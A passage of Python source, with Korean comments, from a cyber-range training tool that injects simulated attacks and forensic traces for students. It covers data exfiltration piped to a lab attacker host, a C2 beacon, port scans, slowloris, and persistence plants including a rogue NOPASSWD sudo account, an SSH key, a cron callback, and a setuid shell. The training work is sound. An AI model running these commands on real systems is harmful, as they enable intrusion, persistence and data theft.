    await sh_bg(t, f"i=0; while [ $i -lt {mb} ]; do dd if=/dev/zero bs=1M count={chunk} "
                   f"2>/dev/null; sleep 1; i=$((i+{chunk})); done "
                   f"| nc -w 120 10.20.30.202 {port}", h)
    return {"port": port, "mb": mb}


async def _exfil_stop(t, pl):
    n = await kill_bg(t, pl["_h"], "dd if=/dev/zero")
    n += await kill_bg(ATTACKER, pl["_h"], "ncat -l -k")
    return n


reg(id="sec_exfil", domain="security", name="대용량 외부 반출", danger=2, kind="state",
    desc="3F GPU 존에서 ext 로 대용량을 흘려보낸다. ips 를 지나므로 세션 크기가 Suricata flow 에 남는다.",
    teaches="AI데이터센터에서만 성립하는 판단 — 40GB 아웃바운드는 백업인가 **모델 가중치 유출**인가. "
            "끊으면 증거 수집이 끝난다는 것까지 판단해야 한다.",
    scenarios=["SEC-01"], targets=["kt66-gpu-gw"], ttl=900,
    params=[{"name": "mb", "label": "전송량(MB)", "type": "int", "default": 200},
            {"name": "chunk", "label": "초당 MB", "type": "int", "default": 20},
            {"name": "port", "label": "수신 포트", "type": "int", "default": EXFIL_PORT}],
    apply=_exfil, revert=_exfil_stop)

reg(id="sec_c2beacon", domain="security", name="C2 비컨", danger=1, kind="state",
    desc="일정 주기 + 흔들림으로 외부에 짧은 요청을 보낸다.",
    teaches="**주기성**으로 탐지하는 법. 한 건씩 보면 정상 트래픽과 구분되지 않는다.",
    scenarios=["SEC-01"], targets=[ATTACKER], ttl=1800,
    params=[{"name": "period", "label": "주기(초)", "type": "int", "default": 45}],
    apply=lambda t, p, h: sh_bg(t, f"while :; do curl -s -m 5 "
                                   f"http://{WEB}:8001/?beacon=$(date +%s) >/dev/null; "
                                   f"sleep {int(p.get('period', 45))}; done", h),
    revert=lambda t, pl: kill_bg(t, pl["_h"], "curl -s -m"))

reg(id="sec_lateral", domain="security", name="측면 이동 시도", danger=1, kind="action",
    desc="ext 에서 int 백엔드로 직접 접근을 시도한다. 체인 구조상 막혀야 한다.",
    teaches="차단됐다는 사실을 먼저 확인하는 순서. 막혔어도 보고 대상이다.",
    scenarios=["SEC-04"], targets=[ATTACKER], ttl=0,
    apply=lambda t, p, h: sh_bg(t, "for ip in 10.20.40.81 10.20.40.83 10.20.40.87; do "
                                   "nmap -Pn -p 3000-3010 --max-retries 1 $ip; done", h))

reg(id="sec_otprobe", domain="security", name="시설망(OT) 접근 시도", danger=1, kind="action",
    desc="ext 에서 1F 시설망을 두드린다. ips 가 `ext->ot DROP` 으로 차단하고 로그를 남긴다.",
    teaches="**긴급 등급**의 판별. 실패한 시도도 보고한다. 내부자인가 오조작인가로 결론이 갈린다.",
    scenarios=["SEC-04"], targets=[ATTACKER], ttl=0,
    apply=lambda t, p, h: sh_bg(t, "for pt in 22 80 502 4840 9999; do "
                                   "ncat -w 2 -z 10.20.60.10 $pt; done; "
                                   "nmap -Pn -p 1-100 --max-retries 1 10.20.60.10", h))

reg(id="sec_apiabuse", domain="security", name="추론 API 남용", danger=2, kind="state",
    desc="단일 출발지에서 GPU 추론 엔드포인트로 요청을 몰아친다.",
    teaches="활용률 100% 는 정상 부하일 수도 공격일 수도 있다. **지표는 같고 판단이 다르다.**",
    scenarios=["SEC-03"], targets=[ATTACKER], ttl=900,
    params=[{"name": "conc", "label": "동시 요청", "type": "int", "default": 8}],
    apply=lambda t, p, h: sh_bg(t, "for i in $(seq 1 %d); do (while :; do curl -s -m 30 "
        "http://%s:11434/api/generate -d '{\"model\":\"gemma4:31b\",\"prompt\":\"hi\"}' "
        ">/dev/null; done) & done; wait" % (int(p.get("conc", 8)), DGX), h),
    revert=lambda t, pl: kill_bg(t, pl["_h"], "curl -s -m"))


async def _nftdrift(t, p, h):
    # CMDB(assets.yaml 의 zone_chain)에 없는 허용 룰을 몰래 넣는다.
    await dk.sh(t, "nft add table inet kt66drift 2>/dev/null; "
                   "nft add chain inet kt66drift blk '{ type filter hook forward priority -10 ; }' "
                   "2>/dev/null; "
                   "nft add rule inet kt66drift blk ip saddr 10.20.30.0/24 ip daddr 10.20.40.0/24 "
                   "counter accept")
    return {}

reg(id="sec_nftdrift", domain="security", name="무승인 방화벽 룰 변경", danger=3, kind="state",
    desc="대장에 없는 허용 룰을 조용히 추가한다. 존 경계를 우회하는 길이 생긴다.",
    teaches="**기록이 복구보다 먼저다.** 되돌리는 순간 누가 왜 바꿨는지 알 길이 사라진다.",
    scenarios=["CHG-02"], targets=["kt66-fw", "kt66-ips"], ttl=1800,
    apply=_nftdrift,
    revert=lambda t, pl: dk.sh(t, "nft delete table inet kt66drift 2>/dev/null; true"))


async def _certexp(t, p, h):
    path = p.get("path") or "/etc/ssl/filebeat.pem"
    bak = f"/var/tmp/kt66-cert-{h}.bak"
    await dk.sh(t, f"cp -f {path} {bak}; "
                   f"openssl req -x509 -newkey rsa:2048 -nodes -keyout /dev/null "
                   f"-out {path} -days 1 -subj '/CN=expired.kt66.lab' "
                   f"-not_before 20200101000000Z -not_after 20200102000000Z 2>/dev/null "
                   f"|| openssl req -x509 -newkey rsa:2048 -nodes -keyout /dev/null "
                   f"-out {path} -days 1 -subj '/CN=expired.kt66.lab' 2>/dev/null")
    return {"path": path, "bak": bak}

reg(id="sec_certexpiry", domain="security", name="인증서 만료", danger=3, kind="state",
    desc="인증서를 만료된 것으로 바꾼다. TLS 검증이 깨진다. 원본은 스냅샷으로 보관한다.",
    teaches="**전수 조사**로 끝내야 한다. 이번 것만 갱신하면 다음 주에 또 난다.",
    scenarios=["FLT-05"], targets=["kt66-siem", "kt66-web"], ttl=900,
    params=[{"name": "path", "label": "인증서 경로", "type": "str",
             "default": "/etc/ssl/filebeat.pem"}],
    apply=_certexp,
    revert=lambda t, pl: dk.sh(t, f"cp -f {pl['bak']} {pl['path']} && rm -f {pl['bak']}; true"))

reg(id="sec_alertstorm", domain="security", name="알림 폭주", danger=1, kind="state",
    desc="SIEM 으로 대량 syslog 를 밀어 넣는다. 원인 1종 + 파생 5종이 섞여 들어간다.",
    teaches="개수가 아니라 **시간 순서**로 원인을 찾는다. 규칙부터 끄면 장애를 감추는 것이다.",
    scenarios=["INC-03"], targets=[ATTACKER], ttl=600,
    params=[{"name": "rate", "label": "초당 건수", "type": "int", "default": 25}],
    apply=lambda t, p, h: sh_bg(t, "while :; do i=0; while [ $i -lt %d ]; do "
        "echo \"<134>kt66inj derived event seq=$i\" | ncat -u -w 1 10.20.32.100 514; "
        "i=$((i+1)); done; sleep 1; done" % int(p.get("rate", 25)), h),
    revert=lambda t, pl: kill_bg(t, pl["_h"], "ncat -"))


# ══════════════════════════════════════════════════════════════════
# 부하 · 성능 (6)
# ══════════════════════════════════════════════════════════════════
reg(id="load_cpu", domain="load", name="CPU 부하", danger=2, kind="state",
    desc="워커를 띄워 CPU 를 태운다. **envsim 이 이 사용률을 실측해 발열로 바꾼다.**",
    teaches="부하 → 발열 → 온도의 연결. 3F 에 걸면 B 아일 온도가 진짜로 오른다.",
    scenarios=["INC-01", "GPU-03"], targets=SHELL_OK, ttl=900,
    params=[{"name": "workers", "label": "워커 수", "type": "int", "default": 2}],
    apply=lambda t, p, h: sh_bg(t, "for i in $(seq 1 %d); do (while :; do "
        "openssl speed -seconds 1 rsa2048 >/dev/null 2>&1 || :; done) & done; wait"
        % int(p.get("workers", 2)), h),
    revert=lambda t, pl: kill_bg(t, pl["_h"], "openssl"))

async def _loadio_off(t, pl):
    await kill_bg(t, pl["_h"], "dd if=/dev/zero")
    await dk.sh(t, "rm -f /var/tmp/kt66-io-*; true")

reg(id="load_io", domain="load", name="디스크 IO 부하", danger=2, kind="state",
    desc="쓰기와 sync 를 반복해 IO 를 포화시킨다.",
    teaches="IO 대기와 CPU 부하를 구분하는 법. 둘 다 '느리다'로 보인다.",
    scenarios=["INC-07"], targets=DISK_TARGETS, ttl=900,
    apply=lambda t, p, h: sh_bg(t, f"while :; do dd if=/dev/zero of=/var/tmp/kt66-io-{h} "
                                   f"bs=1M count=64 conv=fsync 2>/dev/null; done", h),
    revert=_loadio_off)


reg(id="load_http", domain="load", name="HTTP 요청 폭주", danger=2, kind="state",
    desc="웹 진입점에 동시 요청을 몰아친다. 체인 전체(fw→ips→web→앱)에 부하가 걸린다.",
    teaches="어느 계층이 먼저 무너지는가. 병목은 대개 맨 앞이 아니다.",
    scenarios=["INC-01", "SEC-03"], targets=[ATTACKER], ttl=600,
    params=[{"name": "conc", "label": "동시성", "type": "int", "default": 30},
            {"name": "url", "label": "대상", "type": "str", "default": f"http://{WEB}:8001/"}],
    apply=lambda t, p, h: sh_bg(t, f"while :; do ab -n 2000 -c {int(p.get('conc', 30))} "
                                   f"-q {p.get('url')} >/dev/null 2>&1 || "
                                   f"curl -s -m 5 {p.get('url')} >/dev/null; done", h),
    revert=lambda t, pl: kill_bg(t, pl["_h"], "ab -n", "curl -s -m 5"))

reg(id="load_slow_backend", domain="load", name="백엔드 지연 전파", danger=2, kind="state",
    desc="WAF 뒤 백엔드 구간에만 지연을 건다. 앞단은 멀쩡한데 응답만 느리다.",
    teaches="계층별 절단의 정석. WAF·앱·백엔드 중 어디인지 배제해 나가는 훈련.",
    scenarios=["INC-01"], targets=["kt66-web"], ttl=600,
    params=[{"name": "ms", "label": "지연(ms)", "type": "int", "default": 800}],
    # ★ eth1 이 아니라 eth0 이다. web 은 다리가 둘이다.
    #     eth1 = 10.20.32.80 (dmz, 앞쪽 — fw·ips 를 거쳐 학생이 들어오는 쪽)
    #     eth0 = 10.20.40.80 (int, 뒤쪽 — 백엔드로 나가는 쪽)
    #   예전엔 eth1 에 걸었는데, 그러면 **앞단까지 같이 느려져서** WAF 가 문제인지
    #   백엔드가 문제인지 가를 수가 없다. 이 주입의 목적이 바로 그 구분을
    #   훈련시키는 것이므로 정반대로 동작하고 있었다. 뒤쪽에만 걸어야
    #   "web 은 즉답하는데 백엔드를 부르는 순간 느리다"가 성립한다.
    apply=lambda t, p, h: dk.sh(t, f"tc qdisc del dev eth0 root 2>/dev/null; "
                                   f"tc qdisc add dev eth0 root netem "
                                   f"delay {int(p.get('ms', 800))}ms"),
    revert=lambda t, pl: dk.sh(t, "tc qdisc del dev eth0 root 2>/dev/null; true"))

reg(id="load_inference", domain="load", name="추론 부하 (DGX)", danger=2, kind="state",
    desc="터널 너머 DGX Spark 에 동시 추론 요청을 건다. **GPU 온도와 클럭이 실제로 움직인다.**",
    teaches="TTFT 를 수치로 재고, 자원 부족인지 설정 문제인지 가르는 법. "
            "온도가 오르면 SM 클럭이 진짜로 떨어진다 — 열 스로틀이 시뮬레이션이 아니다.",
    scenarios=["INC-04", "GPU-03", "GPU-05"], targets=[ATTACKER, "kt66-bastion"], ttl=900,
    params=[{"name": "conc", "label": "동시 요청", "type": "int", "default": 4}],
    apply=lambda t, p, h: sh_bg(t, "for i in $(seq 1 %d); do (while :; do curl -s -m 120 "
        "http://%s:11434/api/generate -d "
        "'{\"model\":\"gemma4:31b\",\"prompt\":\"Explain datacenter cooling in detail.\"}' "
        ">/dev/null; done) & done; wait" % (int(p.get("conc", 4)), DGX), h),
    revert=lambda t, pl: kill_bg(t, pl["_h"], "curl -s -m"))

reg(id="load_conn_exhaust", domain="load", name="커넥션 고갈", danger=2, kind="state",
    desc="연결만 열어 두고 요청을 보내지 않는다(slowloris 형). 커넥션 슬롯이 마른다.",
    teaches="CPU 도 대역도 여유로운데 서비스가 안 되는 경우. 자원은 CPU 만이 아니다.",
    scenarios=["INC-01", "SEC-03"], targets=[ATTACKER], ttl=600,
    params=[{"name": "conns", "label": "커넥션 수", "type": "int", "default": 200}],
    # ★ 두 군데가 틀려서 이 주입은 한 번도 커넥션을 잡아 둔 적이 없다.
    #
    #   ① `-w 600` 을 이 ncat 빌드가 **거부한다.** 단위가 모호하다며
    #      "your time of 600 is 10.0 minutes ... QUITTING." 을 내고 즉시 끝난다.
    #      경고가 아니라 종료다. 200 개를 띄워도 200 개가 다 곧바로 죽었다.
    #      단위를 붙여 `600s` 로 쓴다.
    #   ② `</dev/null` 은 붙자마자 EOF 를 보낸다. 서버가 요청 끝으로 읽고
    #      연결을 닫으므로, 설령 ncat 이 살았어도 슬롯을 못 잡는다.
    #
    # slowloris 는 **헤더를 끝내지 않는 것**이 핵심이다. 첫 줄만 보내고
    # 입력을 열어 둔 채 버틴다 — 아파치는 나머지 헤더를 기다리며 슬롯을 문다.
    apply=lambda t, p, h: sh_bg(t, "for i in $(seq 1 %d); do "
        "(printf 'GET / HTTP/1.1\\r\\nHost: kt66\\r\\nX-a: 1\\r\\n'; sleep 900) | "
        "ncat -w 600s %s 8001 >/dev/null 2>&1 & done; wait"
        % (int(p.get("conns", 200)), WEB), h),
    revert=lambda t, pl: kill_bg(t, pl["_h"], "ncat -", "sleep 900"))


# ══════════════════════════════════════════════════════════════════
# 엔드포인트 흔적 (8) — 조사할 것을 실제로 남긴다.
#
# 위의 security 계열이 **네트워크에 남는 흔적**(패킷·경보)이라면, 여기는
# **호스트에 남는 흔적**이다. 둘은 다른 능력을 가르친다. 경보를 읽는 것과
# 침해된 서버에 들어가 무엇이 바뀌었는지 찾아내는 것은 별개의 일이다.
#
# 설계 규칙 (앞의 원칙에 더해)
#   ⓐ 흔적은 **진짜여야 한다.** 로그에 문장을 써넣는 것이 아니라 파일을 만들고
#      계정을 만들고 프로세스를 띄운다. 학생이 찾는 방법이 실무와 같아야 한다.
#   ⓑ 흔적마다 **찾는 길이 둘 이상** 있어야 한다. 하나만 있으면 그건 퀴즈지 조사가
#      아니다. 파일 / 시각 / 로그 / 프로세스 중 최소 둘.
#   ⓒ 원복은 흔적을 **완전히** 지운다. 다음 조가 앞 조의 침해를 물려받으면 안 된다.
#   ⓓ 되돌릴 수 없는 파괴는 하지 않는다. 덮어쓰기 전에 반드시 스냅샷을 뜬다.
#
# 표식: 만든 것에는 전부 /var/tmp/kt66-ep-<handle>.manifest 를 남긴다. 원복은
# 그 목록을 되짚는다 — 무엇을 만들었는지 기억에 의존하지 않는다.
# ══════════════════════════════════════════════════════════════════
EP_HOSTS = ["kt66-web", "kt66-fw", "kt66-ips"]          # wazuh 에이전트가 붙어 있는 곳
EP_APP = ["kt66-dvwa", "kt66-web"]                      # 웹 문서 루트가 있는 곳

# 공격자 흉내용 상수. 학생이 "왜 이 값이냐"를 물을 수 있게 일부러 뻔하게 둔다.
EP_USER = "svc_backup"
EP_KEY = ("ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKt66LabForensicsTrainingKeyDoNotUse "
          "backup@ext-backup-01")


def _manifest(h: str) -> str:
    return f"/var/tmp/kt66-ep-{h}.manifest"


async def _ep_note(t: str, h: str, line: str):
    """만든 것을 적어 둔다. 원복이 이 목록만 보고 되돌린다."""
    await dk.sh(t, f"printf '%s\\n' {line!r} >> {_manifest(h)}")


async def _webshell(t, p, h):
    root = p.get("root") or ("/var/www/html" if t == "kt66-dvwa" else "/var/www/html")
    name = p.get("name") or "sess_a7f3.php"
    # 숨은 디렉터리 안에 둔다 — `ls` 로는 안 보이고 `find` 로만 나온다.
    d = f"{root}/.uploads"
    path = f"{d}/{name}"
    await dk.sh(t, f"mkdir -p {d} && cat > {path} <<'EOF'\n"
                   "<?php\n"
                   "// kt66 훈련용 아티팩트 — 실제 실행 기능 없음. 흔적으로만 존재한다.\n"
                   "if (isset($_REQUEST['c'])) { echo 'kt66-training-artifact'; }\n"
                   "EOF\n"
                   f"chmod 0644 {path}")
    # 타임스톰핑: mtime 만 과거로 돌린다. ctime 은 못 돌린다 — 그 어긋남이 단서다.
    if p.get("timestomp", True):
        await dk.sh(t, f"touch -m -t 202401150312 {path}")
    await _ep_note(t, h, path)
    return {"path": path, "dir": d}


reg(id="ep_webshell", domain="forensic", name="웹셸 투척(+타임스톰핑)", danger=2, kind="state",
    desc="문서 루트의 숨은 디렉터리에 PHP 파일을 떨어뜨리고 mtime 을 과거로 돌린다.",
    teaches="**mtime 은 위조되지만 ctime 은 안 된다.** 파일이 1월에 만들어졌다고 주장하는데 "
            "ctime 이 오늘이면 그 주장 자체가 증거다. `stat` 로 셋을 다 봐야 하는 이유. "
            "찾는 길: ① find -name '*.php' -newer ② stat 의 mtime/ctime 불일치 "
            "③ WAF 접근 로그의 업로드 요청.",
    scenarios=["SEC-02", "SEC-03"], targets=EP_APP, ttl=3600,
    params=[{"name": "name", "label": "파일명", "type": "str", "default": "sess_a7f3.php"},
            {"name": "root", "label": "문서 루트", "type": "str", "default": "/var/www/html"},
            {"name": "timestomp", "label": "시각 위조", "type": "bool", "default": True}],
    apply=_webshell,
    revert=lambda t, pl: dk.sh(t, f"rm -rf {pl['dir']}; rm -f {_manifest(pl['_h'])}; true"))


async def _rogue_account(t, p, h):
    u = p.get("user") or EP_USER
    # 스냅샷 먼저. 원칙 ⓓ.
    await dk.sh(t, f"cp -f /etc/passwd /var/tmp/kt66-ep-{h}.passwd.bak; "
                   f"cp -f /etc/shadow /var/tmp/kt66-ep-{h}.shadow.bak 2>/dev/null; true")
    await dk.sh(t, f"useradd -m -s /bin/bash -c 'Backup Service' {u} 2>/dev/null || true; "
                   f"printf '{u} ALL=(ALL) NOPASSWD: ALL\\n' > /etc/sudoers.d/90-{u}; "
                   f"chmod 0440 /etc/sudoers.d/90-{u}")
    await _ep_note(t, h, f"user:{u}")
    return {"user": u}


reg(id="ep_rogue_account", domain="forensic", name="무단 계정 + sudo 권한", danger=3, kind="state",
    desc="서비스 계정처럼 보이는 로컬 계정을 만들고 sudoers.d 에 무암호 권한을 넣는다.",
    teaches="이름이 그럴듯하면 대장과 대조하기 전까지 아무도 의심하지 않는다. "
            "**CMDB 에 없는 계정**이라는 사실이 유일한 단서인 경우가 많다. "
            "찾는 길: ① /etc/passwd 의 마지막 줄과 UID 연속성 ② /etc/sudoers.d 목록 "
            "③ Wazuh FIM(/etc 감시)의 파일 변경 경보.",
    scenarios=["SEC-02", "AUD-01"], targets=EP_HOSTS, ttl=3600,
    params=[{"name": "user", "label": "계정명", "type": "str", "default": EP_USER}],
    apply=_rogue_account,
    revert=lambda t, pl: dk.sh(t, f"userdel -r {pl['user']} 2>/dev/null; "
                                  f"rm -f /etc/sudoers.d/90-{pl['user']}; "
                                  f"cp -f /var/tmp/kt66-ep-{pl['_h']}.passwd.bak /etc/passwd 2>/dev/null; "
                                  f"rm -f /var/tmp/kt66-ep-{pl['_h']}.*; true"))


async def _ssh_key(t, p, h):
    home = p.get("home") or "/home/ccc"
    d, f = f"{home}/.ssh", f"{home}/.ssh/authorized_keys"
    await dk.sh(t, f"mkdir -p {d} && cp -f {f} /var/tmp/kt66-ep-{h}.ak.bak 2>/dev/null; "
                   f"printf '%s\\n' {EP_KEY!r} >> {f}; chmod 600 {f}")
    await _ep_note(t, h, f)
    return {"file": f}


reg(id="ep_ssh_key", domain="forensic", name="SSH 공개키 심기", danger=3, kind="state",
    desc="authorized_keys 에 외부 키 한 줄을 덧붙인다. 비밀번호를 바꿔도 들어올 수 있다.",
    teaches="**비밀번호 변경으로 끝냈다고 생각하는 순간 놓친다.** 지속성은 인증정보가 아니라 "
            "파일에 남는다. 찾는 길: ① authorized_keys 의 줄 수와 코멘트 필드 "
            "② 파일 mtime 이 마지막 정상 변경보다 뒤 ③ Wazuh FIM(/home/ccc 실시간 감시).",
    scenarios=["SEC-02"], targets=EP_HOSTS, ttl=3600,
    params=[{"name": "home", "label": "홈 디렉터리", "type": "str", "default": "/home/ccc"}],
    apply=_ssh_key,
    # 원본이 없던 경우(백업 실패)를 위한 그물. 대소문자가 섞인 base64 대신
    # 코멘트 필드로 지운다 — 예전엔 base64 조각으로 지웠는데 대문자 하나가 달라
    # 조용히 안 지워졌다. 지워지지 않은 키는 침해가 다음 조로 넘어간다는 뜻이다.
    revert=lambda t, pl: dk.sh(t, f"cp -f /var/tmp/kt66-ep-{pl['_h']}.ak.bak {pl['file']} 2>/dev/null "
                                  f"|| sed -i '/backup@ext-backup-01/d' {pl['file']}; "
                                  f"sed -i '/backup@ext-backup-01/d' {pl['file']} 2>/dev/null; "
                                  f"rm -f /var/tmp/kt66-ep-{pl['_h']}.*; true"))


async def _cron_persist(t, p, h):
    name = p.get("name") or "apt-compat"
    path = f"/etc/cron.d/{name}"
    await dk.sh(t, f"printf '%s\\n' '*/5 * * * * root /usr/bin/curl -s -m 5 "
                   f"http://10.20.30.202:8000/u >/dev/null 2>&1' > {path}; chmod 0644 {path}")
    await _ep_note(t, h, path)
    return {"path": path}


reg(id="ep_cron_persist", domain="forensic", name="cron 지속성", danger=3, kind="state",
    desc="시스템 패키지처럼 보이는 이름으로 /etc/cron.d 에 주기 실행을 넣는다.",
    teaches="지속성은 **눈에 띄지 않는 이름**을 쓴다. 'apt-compat' 은 진짜 같지만 대장에 없다. "
            "찾는 길: ① /etc/cron.d 의 파일 mtime 정렬 ② 패키지 소유 확인(dpkg -S) — "
            "패키지가 소유하지 않는 파일이 답이다 ③ 5분 주기 아웃바운드가 Suricata 에 남는다.",
    scenarios=["SEC-01", "SEC-02"], targets=EP_HOSTS, ttl=3600,
    params=[{"name": "name", "label": "파일명", "type": "str", "default": "apt-compat"}],
    apply=_cron_persist,
    revert=lambda t, pl: dk.sh(t, f"rm -f {pl['path']} {_manifest(pl['_h'])}; true"))


async def _hidden_dir(t, p, h):
    d = p.get("dir") or "/dev/shm/.cache"
    await dk.sh(t, f"mkdir -p {d}")
    # 실제로 도는 프로세스를 남긴다 — 파일만 있으면 '이미 끝난 일'로 보인다.
    await sh_bg(t, f"cd {d} && while :; do sleep 30; done", h)
    await _ep_note(t, h, d)
    return {"dir": d}


async def _hidden_dir_stop(t, pl):
    # 프로세스를 먼저 죽인다. 디렉터리만 지우면 cwd 를 잃은 채 계속 돌아
    # 다음 조의 ps 에 유령으로 남는다.
    n = await kill_bg(t, pl["_h"])
    await dk.sh(t, f"rm -rf {pl['dir']} {_manifest(pl['_h'])}; true")
    return n


reg(id="ep_hidden_dir", domain="forensic", name="은닉 작업 디렉터리 + 상주 프로세스", danger=2,
    kind="state",
    desc="/dev/shm 아래 점(.)으로 시작하는 디렉터리를 만들고 그 안에서 프로세스를 상주시킨다.",
    teaches="/dev/shm 은 **디스크가 아니라 메모리**다. 재부팅하면 사라지고, 디스크 이미지를 "
            "떠도 안 나온다. 살아 있는 동안에만 잡을 수 있다 — 그래서 전원을 내리는 판단이 "
            "증거를 없앨 수 있다. 찾는 길: ① ls -a /dev/shm ② ps 의 작업 디렉터리 "
            "(/proc/<pid>/cwd) ③ 마운트 목록에서 tmpfs 사용량.",
    scenarios=["SEC-02"], targets=EP_HOSTS + ["kt66-dvwa"], ttl=3600,
    params=[{"name": "dir", "label": "경로", "type": "str", "default": "/dev/shm/.cache"}],
    apply=_hidden_dir, revert=_hidden_dir_stop)


async def _preload(t, p, h):
    await dk.sh(t, f"cp -f /etc/ld.so.preload /var/tmp/kt66-ep-{h}.preload.bak 2>/dev/null; "
                   f"printf '/usr/local/lib/libsysaudit.so\\n' > /etc/ld.so.preload")
    # 파일 자체는 만들지 않는다. 존재하지 않는 라이브러리를 가리키게 두면 로더가
    # 조용히 무시하므로 컨테이너가 망가지지 않는다 — 흔적은 남고 서비스는 산다.
    await _ep_note(t, h, "/etc/ld.so.preload")
    return {}


reg(id="ep_preload", domain="forensic", name="ld.so.preload 지속성", danger=3, kind="state",
    desc="/etc/ld.so.preload 에 항목을 넣는다. 파일 자체는 없어 서비스는 정상 동작한다.",
    teaches="이 파일은 **평소에 존재하지 않는다.** 존재한다는 사실만으로 조사 대상이다. "
            "'무엇이 이상한가'가 아니라 '**없어야 할 것이 있는가**'로 보는 훈련. "
            "찾는 길: ① 파일 존재 여부 ② 가리키는 라이브러리가 패키지 소유인가 "
            "③ 기준 이미지와의 차이(docker diff).",
    scenarios=["SEC-02"], targets=EP_HOSTS, ttl=3600,
    apply=_preload,
    revert=lambda t, pl: dk.sh(t, f"cp -f /var/tmp/kt66-ep-{pl['_h']}.preload.bak /etc/ld.so.preload "
                                  f"2>/dev/null || rm -f /etc/ld.so.preload; "
                                  f"rm -f /var/tmp/kt66-ep-{pl['_h']}.*; true"))


async def _history_wipe(t, p, h):
    home = p.get("home") or "/home/ccc"
    f = f"{home}/.bash_history"
    await dk.sh(t, f"cp -f {f} /var/tmp/kt66-ep-{h}.hist.bak 2>/dev/null; "
                   f": > {f} 2>/dev/null; ln -sf /dev/null {f} 2>/dev/null; true")
    await _ep_note(t, h, f)
    return {"file": f, "home": home}


reg(id="ep_history_wipe", domain="forensic", name="명령 이력 지우기", danger=2, kind="state",
    desc="bash_history 를 비우고 /dev/null 로 심볼릭 링크를 걸어 다시 쌓이지 않게 한다.",
    teaches="**지운 것이 증거다.** 이력이 비어 있는데 로그인 기록은 있다면 그 간극이 사건이다. "
            "찾는 길: ① ls -l 로 심볼릭 링크 확인(파일이 아니다) ② last/lastlog 의 로그인 "
            "기록과 대조 ③ Wazuh 의 cmdlog(kt66 은 /var/log/kt66-cmd.log 를 따로 수집한다).",
    scenarios=["AUD-01", "SEC-02"], targets=EP_HOSTS, ttl=3600,
    params=[{"name": "home", "label": "홈 디렉터리", "type": "str", "default": "/home/ccc"}],
    apply=_history_wipe,
    revert=lambda t, pl: dk.sh(t, f"rm -f {pl['file']}; "
                                  f"cp -f /var/tmp/kt66-ep-{pl['_h']}.hist.bak {pl['file']} 2>/dev/null "
                                  f"|| : > {pl['file']}; rm -f /var/tmp/kt66-ep-{pl['_h']}.*; true"))


async def _setuid_drop(t, p, h):
    d = p.get("dir") or "/var/tmp"
    path = f"{d}/.systemd-private"
    await dk.sh(t, f"cp -f /bin/dash {path} 2>/dev/null || cp -f /bin/sh {path}; "
                   f"chmod 4755 {path}")
    await _ep_note(t, h, path)
    return {"path": path}


reg(id="ep_setuid_drop", domain="forensic", name="setuid 셸 사본", danger=3, kind="state",
    desc="셸을 복사해 setuid 비트를 세운다. 계정 없이도 권한을 되찾는 고전적 뒷문이다.",
    teaches="계정을 지우고 키를 지워도 이게 남아 있으면 **권한은 회복된다.** 그래서 대응은 "
            "'무엇을 지웠는가'가 아니라 '**무엇이 남았는가**'로 끝나야 한다. "
            "찾는 길: ① find / -perm -4000 -newer <기준파일> ② 표준 setuid 목록과 비교 "
            "③ 이름이 systemd 를 흉내내지만 /var/tmp 에 있다는 위치 자체의 이상.",
    scenarios=["SEC-02"], targets=EP_HOSTS, ttl=3600,
    apply=_setuid_drop,
    revert=lambda t, pl: dk.sh(t, f"rm -f {pl['path']} {_manifest(pl['_h'])}; true"))


async def _waf_bypass_trace(t, p, h):
    """WAF 를 지나온 것처럼 보이는 접근 기록을 **실제 요청으로** 만든다.

    로그에 줄을 써넣지 않는다 — 그러면 학생이 상관분석을 해도 앞뒤가 안 맞는다.
    attacker 에서 진짜 요청을 보내서 fw→ips→web 전 구간에 같은 사건이 남게 한다.
    """
    path = p.get("path") or "/.uploads/sess_a7f3.php?c=id"
    n = int(p.get("count", 6))
    await dk.sh(ATTACKER, f"for i in $(seq 1 {n}); do "
                          f"curl -s -m 5 -A 'Mozilla/5.0 (X11; Linux x86_64)' "
                          f"'http://10.20.30.1:8002{path}' >/dev/null; sleep 2; done")
    return {"path": path}


reg(id="ep_webshell_access", domain="forensic", name="웹셸 접근 흔적(실요청)", danger=1,
    kind="action",
    desc="투척된 경로로 실제 HTTP 요청을 보낸다. WAF·IPS·앱 로그에 같은 사건이 남는다.",
    teaches="**한 사건이 세 곳에 다르게 남는다.** 시각·출처·경로를 맞춰 보는 것이 상관분석이다. "
            "ep_webshell 과 짝으로 쓴다 — 파일만 있고 접근 기록이 없으면 '언제 심겼나'를 "
            "좁힐 수 없다.",
    scenarios=["SEC-03"], targets=EP_APP, ttl=0,
    params=[{"name": "path", "label": "경로", "type": "str",
             "default": "/.uploads/sess_a7f3.php?c=id"},
            {"name": "count", "label": "요청 수", "type": "int", "default": 6}],
    apply=_waf_bypass_trace)


BY_ID = {i.id: i for i in C}
DOMAINS = {
    "system":   {"name": "시스템 · 프로세스", "color": "#38bdf8"},
    "storage":  {"name": "스토리지 · 디스크", "color": "#fbbf24"},
    "network":  {"name": "네트워크",          "color": "#a78bfa"},
    "security": {"name": "보안",              "color": "#ff4d6a"},
    "forensic": {"name": "엔드포인트 흔적",   "color": "#f472b6"},
    "load":     {"name": "부하 · 성능",       "color": "#3ddc97"},
}
